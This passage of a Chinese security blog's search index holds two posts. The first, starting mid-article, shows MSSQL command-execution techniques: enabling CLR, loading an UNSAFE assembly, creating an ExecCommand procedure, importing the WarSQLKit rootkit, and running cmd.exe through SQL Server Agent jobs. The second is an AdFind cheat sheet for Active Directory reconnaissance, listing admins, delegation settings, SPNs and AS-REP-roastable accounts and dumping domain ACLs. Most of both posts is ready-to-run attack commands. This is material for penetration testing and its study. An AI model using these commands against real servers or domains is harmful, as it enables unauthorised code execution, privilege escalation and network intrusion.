href="#SQL-Server-2017-版本之前" class="headerlink" title="SQL Server 2017 版本之前"></a>SQL Server 2017 版本之前</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- 显示高级选项</span>sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- 启用CLR</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> master <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">ON</span><span class="token punctuation">;</span> <span class="token comment">-- 将存储.Net程序集的数据库配置为可信赖的</span></code></pre><h3 id="SQL-Server-2017-版本及之后"><a href="#SQL-Server-2017-版本及之后" class="headerlink" title="SQL Server 2017 版本及之后"></a>SQL Server 2017 版本及之后</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>sp_add_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span> <span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span><span class="token punctuation">;</span> <span class="token comment">-- 将某程序集的SHA512哈希值添加到可信程序集列表中</span></code></pre><h2 id="程序集的导入和创建"><a href="#程序集的导入和创建" class="headerlink" title="程序集的导入和创建"></a>程序集的导入和创建</h2><p>通过十六进制字符串创建程序集</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY clrassem <span class="token keyword">from</span> <span class="token operator">&lt;</span>HEX STRING<span class="token operator">></span> <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span>  <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>  <span class="token keyword">FROM</span> <span class="token number">0x4d5a</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>GO</code></pre><p>创建存储过程，以从程序集运行代码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> debugrun <span class="token keyword">AS</span> EXTERNAL NAME clrassem<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>runner</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span><span class="token variable">@cmd</span> NVARCHAR <span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token keyword">AS</span> EXTERNAL NAME <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>StoredProcedures<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span>go</code></pre><h2 id="利用-CLR-执行系统命令"><a href="#利用-CLR-执行系统命令" class="headerlink" title="利用 CLR 执行系统命令"></a>利用 CLR 执行系统命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> dbo<span class="token punctuation">.</span>ExecCommand <span class="token string">"whoami /all"</span></code></pre><h2 id="删除存储过程、程序集以及受信任的哈希值"><a href="#删除存储过程、程序集以及受信任的哈希值" class="headerlink" title="删除存储过程、程序集以及受信任的哈希值"></a>删除存储过程、程序集以及受信任的哈希值</h2><h3 id="SQL-Server-2017-之前的版本"><a href="#SQL-Server-2017-之前的版本" class="headerlink" title="SQL Server 2017 之前的版本"></a>SQL Server 2017 之前的版本</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> <span class="token operator">&lt;</span>CONNECTED <span class="token keyword">DATABASE</span><span class="token operator">></span> <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">OFF</span></code></pre><h3 id="SQL-Server-2017-及更高版本"><a href="#SQL-Server-2017-及更高版本" class="headerlink" title="SQL Server 2017 及更高版本"></a>SQL Server 2017 及更高版本</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_drop_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span><span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span></code></pre><h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">PROCEDURE</span> debugrun<span class="token punctuation">;</span><span class="token keyword">DROP</span> ASSEMBLY clrassem<span class="token punctuation">;</span>sp_configure <span class="token string">'clr strict security'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span>sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span></code></pre><h2 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h2><p>WarSQLKit 是一个针对 MSSQL CLR 进行利用的工具，有以下两个版本</p><ul><li>WarSQLKit 是完全版本，内置多种功能。</li><li>WarSQLKitMinimal 是简化版，只能执行命令。</li></ul><p>项目地址：<a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></p><p>导入方式和前面差不多</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 导入</span><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>WarSQLKit<span class="token punctuation">]</span>    <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>    <span class="token keyword">FROM</span> <span class="token number">0x4D5A</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>GO<span class="token comment"># 创建</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> sp_cmdExec<span class="token variable">@Command</span> <span class="token punctuation">[</span>nvarchar<span class="token punctuation">]</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token keyword">WITH</span> <span class="token keyword">EXECUTE</span> <span class="token keyword">AS</span> CALLER<span class="token keyword">AS</span>EXTERNAL NAME WarSQLKit<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>CmdExecGO</code></pre><p>用法见 README</p><h1 id="SQL-Server-Agent-Job-代理执行计划任务利用"><a href="#SQL-Server-Agent-Job-代理执行计划任务利用" class="headerlink" title="SQL Server Agent Job 代理执行计划任务利用"></a>SQL Server Agent Job 代理执行计划任务利用</h1><p>SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业</p><p>在 Sql Server 配置管理器，启用 SQL Server 代理，注意 Express 版本 Sql Server 是无法启用的</p><p>创建计划任务</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">USE</span> msdb<span class="token punctuation">;</span> <span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_job <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> sp_add_jobstep <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">,</span> <span class="token variable">@step_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_name1'</span><span class="token punctuation">,</span> <span class="token variable">@subsystem</span> <span class="token operator">=</span> N<span class="token string">'PowerShell'</span><span class="token punctuation">,</span> <span class="token variable">@command</span> <span class="token operator">=</span> N<span class="token string">'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'</span><span class="token punctuation">,</span> <span class="token variable">@retry_attempts</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@retry_interval</span> <span class="token operator">=</span> <span class="token number">5</span> <span class="token punctuation">;</span><span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_jobserver <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_start_job N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/9475">https://xz.aliyun.com/t/9475</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Adfind 常用命令</title>
      <link href="/posts/1385ebc.html"/>
      <url>/posts/1385ebc.html</url>
      
        <content type="html"><![CDATA[<h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="查找受-AD-保护的域中的所有用户"><a href="#查找受-AD-保护的域中的所有用户" class="headerlink" title="查找受 AD 保护的域中的所有用户"></a>查找受 AD 保护的域中的所有用户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=person)(samaccountname=*)(admincount=1)"</span> -dn</code></pre><h2 id="查找域中受-AD-保护的所有组"><a href="#查找域中受-AD-保护的所有组" class="headerlink" title="查找域中受 AD 保护的所有组"></a>查找域中受 AD 保护的所有组</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=group)(admincount=1)"</span> -dn</code></pre><h2 id="查看域管账户"><a href="#查看域管账户" class="headerlink" title="查看域管账户"></a>查看域管账户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind -default -f <span class="token string">"(&amp;(|(&amp;(objectCategory=person)(objectClass=user))(objectCategory=group))(adminCount=1))"</span> -dn</code></pre><h2 id="列出域控制器名称"><a href="#列出域控制器名称" class="headerlink" title="列出域控制器名称"></a>列出域控制器名称</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc dclist</code></pre><h2 id="查看域控版本"><a href="#查看域控版本" class="headerlink" title="查看域控版本"></a>查看域控版本</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -schema -s base objectversion</code></pre><h2 id="查看域内在线的计算机"><a href="#查看域内在线的计算机" class="headerlink" title="查看域内在线的计算机"></a>查看域内在线的计算机</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -sc computers_active name operatingSystem</code></pre><h2 id="查看域内-GPO-信息"><a href="#查看域内-GPO-信息" class="headerlink" title="查看域内 GPO 信息"></a>查看域内 GPO 信息</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc gpodmp</code></pre><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h3 id="查询用户"><a href="#查询用户" class="headerlink" title="查询用户"></a>查询用户</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre><h3 id="查询主机"><a href="#查询主机" class="headerlink" title="查询主机"></a>查询主机</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><h3 id="查询用户-1"><a href="#查询用户-1" class="headerlink" title="查询用户"></a>查询用户</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre><h3 id="查询主机-1"><a href="#查询主机-1" class="headerlink" title="查询主机"></a>查询主机</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre><h2 id="查看域内高权限的-SPN-服务主体名称"><a href="#查看域内高权限的-SPN-服务主体名称" class="headerlink" title="查看域内高权限的 SPN 服务主体名称"></a>查看域内高权限的 SPN 服务主体名称</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"&amp;(servicePrincipalName=*)(admincount=1)"</span> servicePrincipalName</code></pre><h2 id="查看可-AS-REP-Roasting-用户"><a href="#查看可-AS-REP-Roasting-用户" class="headerlink" title="查看可 AS-REP Roasting 用户"></a>查看可 AS-REP Roasting 用户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"useraccountcontrol:1.2.840.113556.1.4.803:=4194304"</span> -dn</code></pre><h2 id="导出整个域的-ACL"><a href="#导出整个域的-ACL" class="headerlink" title="导出整个域的 ACL"></a>导出整个域的 ACL</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc getacls -sddlfilter <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span> -recmute</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
